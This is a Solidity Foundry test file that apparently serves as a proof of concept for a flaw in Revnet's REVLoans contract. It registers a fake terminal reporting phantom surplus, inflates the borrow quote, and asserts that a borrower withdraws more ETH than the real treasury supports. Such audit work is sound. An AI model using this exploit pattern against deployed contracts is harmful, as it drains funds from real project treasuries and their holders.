// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "@bananapus/core-v6/test/helpers/TestBaseWorkflow.sol";
import "@bananapus/core-v6/script/helpers/CoreDeploymentLib.sol";
import "@bananapus/721-hook-v6/script/helpers/Hook721DeploymentLib.sol";
import "@bananapus/suckers-v6/script/helpers/SuckerDeploymentLib.sol";
import "@croptop/core-v6/script/helpers/CroptopDeploymentLib.sol";
import "@bananapus/router-terminal-v6/script/helpers/RouterTerminalDeploymentLib.sol";
import "@croptop/core-v6/src/CTPublisher.sol";
import "@bananapus/suckers-v6/src/JBSuckerRegistry.sol";
import "@bananapus/721-hook-v6/src/JB721TiersHook.sol";
import "@bananapus/721-hook-v6/src/JB721TiersHookDeployer.sol";
import "@bananapus/721-hook-v6/src/JB721TiersHookStore.sol";
import "@bananapus/721-hook-v6/src/JB721CheckpointsDeployer.sol";
import {IJB721CheckpointsDeployer} from "@bananapus/721-hook-v6/src/interfaces/IJB721CheckpointsDeployer.sol";
import "@bananapus/address-registry-v6/src/JBAddressRegistry.sol";
import "@bananapus/address-registry-v6/src/interfaces/IJBAddressRegistry.sol";
import "@bananapus/buyback-hook-v6/src/interfaces/IJBBuybackHookRegistry.sol";
import "@bananapus/core-v6/src/interfaces/IJBPermissions.sol";
import "@bananapus/core-v6/src/interfaces/IJBTerminal.sol";
import "@bananapus/core-v6/src/interfaces/IJBPayoutTerminal.sol";
import "@bananapus/core-v6/src/libraries/JBCashOuts.sol";
import "@bananapus/core-v6/src/libraries/JBConstants.sol";
import "@bananapus/core-v6/src/structs/JBAccountingContext.sol";
import "@bananapus/core-v6/src/structs/JBPermissionsData.sol";
import "@bananapus/core-v6/src/structs/JBTerminalConfig.sol";
import "@bananapus/core-v6/src/structs/JBSplit.sol";
import "@bananapus/core-v6/src/structs/JBRuleset.sol";
import "@bananapus/core-v6/src/structs/JBPayHookSpecification.sol";
import "@bananapus/permission-ids-v6/src/JBPermissionIds.sol";
import "@bananapus/suckers-v6/src/structs/JBSuckerDeployerConfig.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";

import {MockBuybackDataHook} from "../mock/MockBuybackDataHook.sol";
import {REVEmpty721Config} from "../helpers/REVEmpty721Config.sol";
import {REVDeployer} from "../../src/REVDeployer.sol";
import {REVLoans} from "../../src/REVLoans.sol";
import {REVOwner} from "../../src/REVOwner.sol";
import {IREVLoans} from "../../src/interfaces/IREVLoans.sol";
import {IREVDeployer} from "../../src/interfaces/IREVDeployer.sol";
import {REVConfig} from "../../src/structs/REVConfig.sol";
import {REVDescription} from "../../src/structs/REVDescription.sol";
import {REVLoanSource} from "../../src/structs/REVLoanSource.sol";
import {REVStageConfig} from "../../src/structs/REVStageConfig.sol";
import {REVAutoIssuance} from "../../src/structs/REVStageConfig.sol";
import {REVSuckerDeploymentConfig} from "../../src/structs/REVSuckerDeploymentConfig.sol";

contract PhantomSurplusTerminal is ERC165, IJBPayoutTerminal {
    uint256 public fakeSurplus;

    function setFakeSurplus(uint256 newFakeSurplus) external {
        fakeSurplus = newFakeSurplus;
    }

    function currentSurplusOf(uint256, address[] calldata, uint256, uint256) external view override returns (uint256) {
        return fakeSurplus;
    }

    function accountingContextForTokenOf(uint256, address) external pure override returns (JBAccountingContext memory) {
        return JBAccountingContext({
            token: JBConstants.NATIVE_TOKEN, decimals: 18, currency: uint32(uint160(JBConstants.NATIVE_TOKEN))
        });
    }

    function accountingContextsOf(uint256) external pure override returns (JBAccountingContext[] memory) {
        return new JBAccountingContext[](0);
    }

    function addAccountingContextsFor(uint256, JBAccountingContext[] calldata) external override {}

    function addToBalanceOf(
        uint256,
        address,
        uint256,
        bool,
        string calldata,
        bytes calldata
    )
        external
        payable
        override
    {}

    function migrateBalanceOf(uint256, address, IJBTerminal) external pure override returns (uint256) {
        return 0;
    }

    function pay(
        uint256,
        address,
        uint256,
        address,
        uint256,
        string calldata,
        bytes calldata
    )
        external
        payable
        override
        returns (uint256)
    {
        return 0;
    }

    function previewPayFor(
        uint256,
        address,
        uint256,
        address,
        bytes calldata
    )
        external
        pure
        override
        returns (JBRuleset memory, uint256, uint256, JBPayHookSpecification[] memory)
    {
        JBRuleset memory ruleset;
        return (ruleset, 0, 0, new JBPayHookSpecification[](0));
    }

    function sendPayoutsOf(uint256, address, uint256, uint256, uint256) external pure override returns (uint256) {
        return 0;
    }

    function supportsInterface(bytes4 interfaceId) public view override(ERC165, IERC165) returns (bool) {
        return interfaceId == type(IJBTerminal).interfaceId || interfaceId == type(IJBPayoutTerminal).interfaceId
            || super.supportsInterface(interfaceId);
    }

    function useAllowanceOf(
        uint256,
        address,
        uint256,
        uint256,
        uint256,
        address payable,
        address payable,
        string calldata
    )
        external
        pure
        override
        returns (uint256)
    {
        return 0;
    }
}

contract CodexPhantomSurplusTerminalTest is TestBaseWorkflow {
    bytes32 internal constant REV_DEPLOYER_SALT = "REVDeployer";
    address internal constant TRUSTED_FORWARDER = 0xB2b5841DBeF766d4b521221732F9B618fCf34A87;

    address internal USER = makeAddr("user");

    REVDeployer internal REV_DEPLOYER;
    REVOwner internal REV_OWNER;
    REVLoans internal LOANS;
    JB721TiersHook internal EXAMPLE_HOOK;
    IJB721TiersHookDeployer internal HOOK_DEPLOYER;
    IJB721TiersHookStore internal HOOK_STORE;
    IJBAddressRegistry internal ADDRESS_REGISTRY;
    IJBSuckerRegistry internal SUCKER_REGISTRY;
    CTPublisher internal PUBLISHER;
    MockBuybackDataHook internal MOCK_BUYBACK;
    PhantomSurplusTerminal internal PHANTOM_TERMINAL;

    uint256 internal FEE_PROJECT_ID;
    uint256 internal REVNET_ID;

    function setUp() public override {
        super.setUp();

        FEE_PROJECT_ID = jbProjects().createFor(multisig());
        SUCKER_REGISTRY = new JBSuckerRegistry(jbDirectory(), jbPermissions(), multisig(), address(0));
        HOOK_STORE = new JB721TiersHookStore();
        EXAMPLE_HOOK = new JB721TiersHook(
            jbDirectory(),
            jbPermissions(),
            jbPrices(),
            jbRulesets(),
            HOOK_STORE,
            jbSplits(),
            IJB721CheckpointsDeployer(address(new JB721CheckpointsDeployer())),
            multisig()
        );
        ADDRESS_REGISTRY = new JBAddressRegistry();
        HOOK_DEPLOYER = new JB721TiersHookDeployer(EXAMPLE_HOOK, HOOK_STORE, ADDRESS_REGISTRY, multisig());
        PUBLISHER = new CTPublisher(jbDirectory(), jbPermissions(), FEE_PROJECT_ID, multisig());
        MOCK_BUYBACK = new MockBuybackDataHook();
        LOANS = new REVLoans({
            controller: jbController(),
            suckerRegistry: IJBSuckerRegistry(address(0)),
            revId: FEE_PROJECT_ID,
            owner: address(this),
            permit2: permit2(),
            trustedForwarder: TRUSTED_FORWARDER
        });
        REV_OWNER = new REVOwner(
            IJBBuybackHookRegistry(address(MOCK_BUYBACK)),
            jbDirectory(),
            FEE_PROJECT_ID,
            SUCKER_REGISTRY,
            address(LOANS),
            address(0)
        );
        REV_DEPLOYER = new REVDeployer{salt: REV_DEPLOYER_SALT}(
            jbController(),
            SUCKER_REGISTRY,
            FEE_PROJECT_ID,
            HOOK_DEPLOYER,
            PUBLISHER,
            IJBBuybackHookRegistry(address(MOCK_BUYBACK)),
            address(LOANS),
            TRUSTED_FORWARDER,
            address(REV_OWNER)
        );
        REV_OWNER.setDeployer(IREVDeployer(REV_DEPLOYER));
        PHANTOM_TERMINAL = new PhantomSurplusTerminal();

        vm.prank(multisig());
        jbProjects().approve(address(REV_DEPLOYER), FEE_PROJECT_ID);

        _deployFeeProject();
        REVNET_ID = _deployRevnetWithPhantomTerminal();
        vm.deal(USER, 200 ether);
    }

    function test_registeredPhantomTerminalInflatesBorrowAgainstRealTreasury() public {
        uint256 realSurplus = 100 ether;
        uint256 phantomSurplus = 100 ether;

        PHANTOM_TERMINAL.setFakeSurplus(phantomSurplus);

        vm.prank(USER);
        uint256 userTokens = jbMultiTerminal().pay{value: realSurplus}(
            REVNET_ID, JBConstants.NATIVE_TOKEN, realSurplus, USER, 0, "", ""
        );

        uint256 collateral = userTokens / 10;
        uint256 taxRate = 5000;

        uint256 honestBorrowable = JBCashOuts.cashOutFrom({
            surplus: realSurplus, cashOutCount: collateral, totalSupply: userTokens, cashOutTaxRate: taxRate
        });

        uint256 inflatedBorrowable =
            LOANS.borrowableAmountFrom(REVNET_ID, collateral, 18, uint32(uint160(JBConstants.NATIVE_TOKEN)));

        assertGt(inflatedBorrowable, honestBorrowable, "phantom terminal should inflate borrow quote");
        assertLe(inflatedBorrowable, realSurplus, "PoC should remain payable by the honest terminal");

        _grantBurnPermission(USER, REVNET_ID, address(LOANS));

        uint256 balanceBefore = USER.balance;
        vm.prank(USER);
        LOANS.borrowFrom(
            REVNET_ID,
            REVLoanSource({token: JBConstants.NATIVE_TOKEN, terminal: jbMultiTerminal()}),
            inflatedBorrowable,
            collateral,
            payable(USER),
            25,
            USER
        );

        uint256 balanceDelta = USER.balance - balanceBefore;
        assertGt(balanceDelta, honestBorrowable, "borrower extracts more ETH than real treasury surplus supports");
    }

    function _deployFeeProject() internal {
        JBAccountingContext[] memory acc = new JBAccountingContext[](1);
        acc[0] = JBAccountingContext({
            token: JBConstants.NATIVE_TOKEN, decimals: 18, currency: uint32(uint160(JBConstants.NATIVE_TOKEN))
        });
        JBTerminalConfig[] memory tc = new JBTerminalConfig[](1);
        tc[0] = JBTerminalConfig({terminal: jbMultiTerminal(), accountingContextsToAccept: acc});
        REVStageConfig[] memory stages = new REVStageConfig[](1);
        stages[0] = REVStageConfig({
            startsAtOrAfter: uint40(block.timestamp),
            autoIssuances: new REVAutoIssuance[](0),
            splitPercent: 0,
            splits: new JBSplit[](0),
            initialIssuance: uint112(1000e18),
            issuanceCutFrequency: 0,
            issuanceCutPercent: 0,
            cashOutTaxRate: 0,
            extraMetadata: 0
        });
        REVConfig memory feeConfig = REVConfig({
            description: REVDescription("Fee Revnet", "FEE", "", "FEE_TOKEN"),
            baseCurrency: uint32(uint160(JBConstants.NATIVE_TOKEN)),
            splitOperator: multisig(),
            stageConfigurations: stages
        });
        vm.prank(multisig());
        REV_DEPLOYER.deployFor({
            revnetId: FEE_PROJECT_ID,
            configuration: feeConfig,
            terminalConfigurations: tc,
            suckerDeploymentConfiguration: REVSuckerDeploymentConfig({
                deployerConfigurations: new JBSuckerDeployerConfig[](0), salt: keccak256("FEE")
            }),
            tiered721HookConfiguration: REVEmpty721Config.empty721Config(uint32(uint160(JBConstants.NATIVE_TOKEN))),
            allowedPosts: REVEmpty721Config.emptyAllowedPosts()
        });
    }

    function _deployRevnetWithPhantomTerminal() internal returns (uint256 revnetId) {
        JBAccountingContext[] memory acc = new JBAccountingContext[](1);
        acc[0] = JBAccountingContext({
            token: JBConstants.NATIVE_TOKEN, decimals: 18, currency: uint32(uint160(JBConstants.NATIVE_TOKEN))
        });
        JBTerminalConfig[] memory tc = new JBTerminalConfig[](2);
        tc[0] = JBTerminalConfig({terminal: jbMultiTerminal(), accountingContextsToAccept: acc});
        tc[1] = JBTerminalConfig({terminal: PHANTOM_TERMINAL, accountingContextsToAccept: acc});

        REVStageConfig[] memory stages = new REVStageConfig[](1);
        JBSplit[] memory splits = new JBSplit[](1);
        splits[0].beneficiary = payable(multisig());
        splits[0].percent = 10_000;
        stages[0] = REVStageConfig({
            startsAtOrAfter: uint40(block.timestamp),
            autoIssuances: new REVAutoIssuance[](0),
            splitPercent: 0,
            splits: splits,
            initialIssuance: uint112(1000e18),
            issuanceCutFrequency: 0,
            issuanceCutPercent: 0,
            cashOutTaxRate: 5000,
            extraMetadata: 0
        });

        REVConfig memory config = REVConfig({
            description: REVDescription("Phantom", "PHM", "", "PHM_TOKEN"),
            baseCurrency: uint32(uint160(JBConstants.NATIVE_TOKEN)),
            splitOperator: multisig(),
            stageConfigurations: stages
        });

        vm.prank(multisig());
        (revnetId,) = REV_DEPLOYER.deployFor({
            revnetId: 0,
            configuration: config,
            terminalConfigurations: tc,
            suckerDeploymentConfiguration: REVSuckerDeploymentConfig({
                deployerConfigurations: new JBSuckerDeployerConfig[](0), salt: keccak256("PHANTOM")
            }),
            tiered721HookConfiguration: REVEmpty721Config.empty721Config(uint32(uint160(JBConstants.NATIVE_TOKEN))),
            allowedPosts: REVEmpty721Config.emptyAllowedPosts()
        });
    }

    function _grantBurnPermission(address account, uint256 revnetId, address operator) internal {
        uint8[] memory permissionIds = new uint8[](1);
        permissionIds[0] = JBPermissionIds.BURN_TOKENS;

        vm.prank(account);
        jbPermissions()
            .setPermissionsFor(
                account,
                JBPermissionsData({operator: operator, projectId: uint56(revnetId), permissionIds: permissionIds})
            );
    }
}
